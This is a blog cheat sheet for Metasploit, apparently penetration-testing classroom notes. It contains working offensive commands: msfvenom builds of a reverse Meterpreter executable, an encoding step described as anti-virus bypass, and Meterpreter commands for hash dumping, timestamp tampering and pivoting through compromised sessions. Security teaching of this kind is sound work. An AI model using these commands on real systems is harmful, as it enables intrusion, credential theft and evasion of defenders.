<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=Author content="Animesh Roy"><meta name=description content="Metasploit Cheat Sheet"><meta name=facebook-domain-verification content="jnyzsl2w4lvrxyzl0db1iuh5oemd3b"><meta property="fb:pages" content="270723683372909"><title>Metasploit Cheat Sheet! &#183; Classroom Notes by Animesh Roy</title><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0//pure-min.css><!--[if lte IE 8]><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/grids-responsive-old-ie-min.css><![endif]--><!--[if gt IE 8]><!--><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0//grids-responsive-min.css><!--<![endif]--><!--[if lte IE 8]><link rel=stylesheet href=https://classroom.anir0y.in/css/side-menu-old-ie.css><![endif]--><!--[if gt IE 8]><!--><link rel=stylesheet href=https://classroom.anir0y.in/css/side-menu.css><!--<![endif]--><link rel=stylesheet href=https://classroom.anir0y.in/css/blackburn.css><link rel=stylesheet href=https://use.fontawesome.com/releases/v5.9.0/css/all.css><link href="https://fonts.googleapis.com/css?family=Raleway" rel=stylesheet type=text/css><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><link rel=stylesheet href=//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/androidstudio.min.css><script src=//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js></script><script>hljs.initHighlightingOnLoad()</script><link rel="shortcut icon" href=https://classroom.anir0y.in//img/favicon.ico type=image/x-icon></head><body><div id=layout><a href=#menu id=menuLink class=menu-link><span></span></a><div id=menu><a class="pure-menu-heading brand" href=https://classroom.anir0y.in/>Classroom</a><div class=pure-menu><ul class=pure-menu-list><li class=pure-menu-item><a class=pure-menu-link href=https://classroom.anir0y.in/><i class="fa fa-home fa-fw"></i>Home</a></li><li class=pure-menu-item><a class=pure-menu-link href=https://classroom.anir0y.in/post/><i class="fa fa-list fa-fw"></i>Posts</a></li><li class=pure-menu-item><a class=pure-menu-link href=https://classroom.anir0y.in/threatpost/><i class="fa fa-list fa-fw"></i>ThreatPost</a></li></ul></div><div class="pure-menu social"><ul class=pure-menu-list><li class=pure-menu-item><a class=pure-menu-link href=https://twitter.com/anir0y rel=me target=_blank><i class="fab fa-twitter-square fa-fw"></i>Twitter</a></li><li class=pure-menu-item><a class=pure-menu-link href=https://facebook.com/anir0yofficial rel=me target=_blank><i class="fab fa-facebook-square fa-fw"></i>Facebook</a></li><li class=pure-menu-item><a class=pure-menu-link href=https://instagram.com/anir0yofficial rel=me target=_blank><i class="fab fa-instagram fa-fw"></i>Instagram</a></li><li class=pure-menu-item><a class=pure-menu-link href=https://linkedin.com/in/anir0y rel=me target=_blank><i class="fab fa-linkedin fa-fw"></i>LinkedIn</a></li><li class=pure-menu-item><a class=pure-menu-link href=https://github.com/anir0y rel=me target=_blank><i class="fab fa-github-square fa-fw"></i>GitHub</a></li></ul></div><div><div class=small-print><small></small></div><div class=small-print><small>Built with ❤️ By:<a href=https://anir0y.in/ target=_blank>Anir0y</a></small></div></div></div><div id=main><div class=header><h1>Metasploit Cheat Sheet!</h1><h2>Metasploit Cheat Sheet</h2></div><div class=content><div class=post-meta><div><i class="fa fa-calendar fa-fw"></i><time>24 Feb 2021, 00:00</time></div><div><i class="fa fa-tags fa-fw"></i><a class=post-taxonomy-tag href=https://classroom.anir0y.in/tags/metasploit>Metasploit</a>&nbsp;/
<a class=post-taxonomy-tag href=https://classroom.anir0y.in/tags/classroom>Classroom</a>&nbsp;/
<a class=post-taxonomy-tag href=https://classroom.anir0y.in/tags/cheat-sheet>cheat sheet</a></div></div><h4 id=metasploit-cheat-sheet>Metasploit Cheat Sheet</h4><p>The Metasploit Project is a computer security project that provides information on vulnerabilities, helping in the development of penetration tests and IDS signatures.</p><p>Metasploit is a popular tool used by pentest experts. I have prepared a document for you to learn.</p><h4 id=metasploit->Metasploit :</h4><h6 id=search-for-module>Search for module:</h6><pre><code>msf &gt; search [regex]
</code></pre><h6 id=specify-and-exploit-to-use>Specify and exploit to use:</h6><pre><code>msf &gt; use exploit/[ExploitPath]
</code></pre><h6 id=specify-a-payload-to-use>Specify a Payload to use:</h6><pre><code>msf &gt; set PAYLOAD [PayloadPath]
</code></pre><h6 id=show-options-for-the-current-modules>Show options for the current modules:</h6><pre><code>msf &gt; show options
</code></pre><h6 id=set-options>Set options:</h6><pre><code>msf &gt; set [Option] [Value]
</code></pre><h6 id=start-exploit>Start exploit:</h6><pre><code>msf &gt; exploit 
</code></pre><h5 id=useful-auxiliary-modules>Useful Auxiliary Modules</h5><h6 id=port-scanner>Port Scanner:</h6><pre><code>msf &gt; use auxiliary/scanner/portscan/tcp
msf &gt; set RHOSTS 10.10.10.0/24
msf &gt; run
</code></pre><h6 id=dns-enumeration>DNS Enumeration:</h6><pre><code>msf &gt; use auxiliary/gather/dns_enum
msf &gt; set DOMAIN target.tgt
msf &gt; run
</code></pre><h6 id=ftp-server>FTP Server:</h6><pre><code>msf &gt; use auxiliary/server/ftp
msf &gt; set FTPROOT /tmp/ftproot
msf &gt; run
</code></pre><h6 id=proxy-server>Proxy Server:</h6><pre><code>msf &gt; use auxiliary/server/socks4
msf &gt; run 
</code></pre><h4 id=msfvenom->msfvenom :</h4><p>The msfvenom tool can be used to generate Metasploit payloads (such as Meterpreter) as standalone files and optionally encode
them. This tool replaces the former msfpayload and msfencode tools. Run with ‘'-l payloads’ to get a list of payloads.</p><pre><code>$ msfvenom –p [PayloadPath]
–f [FormatType]
LHOST=[LocalHost (if reverse conn.)]
LPORT=[LocalPort]
</code></pre><p>Example :</p><p>Reverse Meterpreter payload as an executable and redirected into a file:</p><pre><code>$ msfvenom -p windows/meterpreter/
reverse_tcp -f exe LHOST=10.1.1.1
LPORT=4444 &gt; met.exe
</code></pre><p>Format Options (specified with –f) &ndash;help-formats – List available output formats</p><p>exe – Executable
pl – Perl
rb – Ruby
raw – Raw shellcode
c – C code</p><p>Encoding Payloads with msfvenom</p><p>The msfvenom tool can be used to apply a level of encoding for anti-virus bypass. Run with &lsquo;-l encoders&rsquo;
to get a list of encoders.</p><pre><code>$ msfvenom -p [Payload] -e [Encoder] -f
[FormatType] -i [EncodeInterations]
LHOST=[LocalHost (if reverse conn.)]
LPORT=[LocalPort]
</code></pre><p>Example</p><p>Encode a payload from msfpayload 5 times using shikata-ga-nai encoder and output as executable:</p><pre><code>$ msfvenom -p windows/meterpreter/
reverse_tcp -i 5 -e x86/shikata_ga_nai -f
exe LHOST=10.1.1.1 LPORT=4444 &gt; mal.exe
</code></pre><h5 id=metasploit-meterpreter>Metasploit Meterpreter</h5><h6 id=base-commands>Base Commands:</h6><p>? / help: Display a summary of commands exit / quit: Exit the Meterpreter session</p><p>sysinfo: Show the system name and OS type</p><p>shutdown / reboot: Self-explanatory</p><p>File System Commands:</p><p>cd: Change directory</p><p>lcd: Change directory on local (attacker&rsquo;s) machine</p><p>pwd / getwd: Display current working directory</p><p>ls: Show the contents of the directory</p><p>cat: Display the contents of a file on screen</p><p>download / upload: Move files to/from the target machine</p><p>mkdir / rmdir: Make / remove directory</p><p>edit: Open a file in the default editor (typically vi)</p><p>Process Commands:</p><p>getpid: Display the process ID that Meterpreter is running inside.</p><p>getuid: Display the user ID that Meterpreter is running with.</p><p>ps: Display process list.</p><p>kill: Terminate a process given its process ID.</p><p>execute: Run a given program with the privileges of the process the Meterpreter is loaded in.</p><p>migrate: Jump to a given destination process ID</p><ul><li><p>Target process must have same or lesser privileges</p></li><li><p>Target process may be a more stable process</p></li><li><p>When inside a process, can access any files that process has a lock on.</p></li></ul><h6 id=network-commands>Network Commands:</h6><p>ipconfig: Show network interface information</p><p>portfwd: Forward packets through TCP session</p><p>route: Manage/view the system&rsquo;s routing table</p><h6 id=misc-commands>Misc Commands:</h6><p>idletime: Display the duration that the GUI of thetarget machine has been idle.</p><p>uictl [enable/disable] [keyboard/mouse]: Enable/disable either the mouse or keyboard of the target machine.</p><p>screenshot: Save as an image a screenshot of the target machine.</p><h6 id=additional-modules>Additional Modules:</h6><p>use [module]: Load the specified module</p><p>Example:</p><p>use priv: Load the priv module</p><p>hashdump: Dump the hashes from the box</p><p>timestomp:Alter NTFS file timestamps</p><h5 id=managing-sessions>Managing Sessions</h5><h6 id=multiple-exploitation>Multiple Exploitation:</h6><p>Run the exploit expecting a single session that is immediately backgrounded:</p><pre><code>msf &gt; exploit -z
</code></pre><p>Run the exploit in the background expecting one or more sessions that are immediately backgrounded:</p><pre><code>msf &gt; exploit –j
</code></pre><h6 id=list-all-current-jobs-usually-exploit-listeners>List all current jobs (usually exploit listeners):</h6><pre><code>msf &gt; jobs –l
</code></pre><h6 id=kill-a-job>Kill a job:</h6><pre><code>msf &gt; jobs –k [JobID]
</code></pre><h5 id=multiple-sessions>Multiple Sessions:</h5><h6 id=list-all-backgrounded-sessions>List all backgrounded sessions:</h6><pre><code>msf &gt; sessions -l
</code></pre><h6 id=interact-with-a-backgrounded-session>Interact with a backgrounded session:</h6><pre><code>msf &gt; session -i [SessionID]
</code></pre><h6 id=background-the-current-interactive-session>Background the current interactive session:</h6><pre><code>meterpreter &gt; &lt;Ctrl+Z&gt;
or
meterpreter &gt; background
</code></pre><h6 id=routing-through-sessions>Routing Through Sessions:</h6><p>All modules (exploits/post/aux) against the target subnet mask will be pivoted through this session.</p><pre><code>msf &gt; route add [Subnet to Route To]
[Subnet Netmask] [SessionID]
</code></pre><h4><i class="fas fa-share-alt" aria-hidden=true></i>&nbsp;Share!</h4><ul class=share-buttons><li><a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fmetasploit-cheat-sheet%2f" target=_blank title="Share on Facebook"><i class="fab fa-facebook" aria-hidden=true></i><span class=sr-only>Share on Facebook</span></a></li>&nbsp;&nbsp;&nbsp;<li><a href="https://twitter.com/intent/tweet?source=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fmetasploit-cheat-sheet%2f" target=_blank title=Tweet><i class="fab fa-twitter" aria-hidden=true></i><span class=sr-only>Tweet</span></a></li>&nbsp;&nbsp;&nbsp;<li><a href="http://www.reddit.com/submit?url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2fmetasploit-cheat-sheet%2f" target=_blank title="Submit to Reddit"><i class="fab fa-reddit-alien" aria-hidden=true></i><span class=sr-only>Submit to Reddit</span></a></li></ul><style>ul.share-buttons{list-style:none;padding:0}ul.share-buttons li{display:inline}ul.share-buttons .sr-only{position:absolute;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);padding:0;border:0;height:1px;width:1px;overflow:hidden}</style><div class="prev-next-post pure-g"><div class=pure-u-1-24 style=text-align:left><a href=https://classroom.anir0y.in/post/ref-powershell/><i class="fa fa-chevron-left"></i></a></div><div class=pure-u-10-24><nav class=prev><a href=https://classroom.anir0y.in/post/ref-powershell/>Awesome Powershell!</a></nav></div><div class=pure-u-2-24>&nbsp;</div><div class=pure-u-10-24></div><div class=pure-u-1-24 style=text-align:right></div></div></div></div></div><script src=https://classroom.anir0y.in/js/ui.js></script><script src=https://classroom.anir0y.in/js/menus.js></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-NZBEX7RBNF"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-NZBEX7RBNF')</script><script src=https://classroom.anir0y.in/js/math-code.js></script><script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>